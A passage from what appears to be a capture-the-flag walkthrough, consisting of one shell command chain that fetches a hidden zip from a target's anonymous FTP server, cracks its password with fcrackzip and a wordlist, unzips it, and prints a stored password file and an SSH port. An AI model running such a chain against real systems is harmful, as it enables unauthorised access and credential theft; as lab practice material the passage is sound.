...
wget --ftp-user=anonymous --ftp-password='' "ftp://$IP:$FTP_PORT/.../.../.I_saved_it_harry.zip" && mv .I_saved_it_harry.zip file.zip && fcrackzip -v -u -D -p $WORDLIST_PATH file.zip && unzip file.zip && cat boot/.pass && cat ssh_port.txt
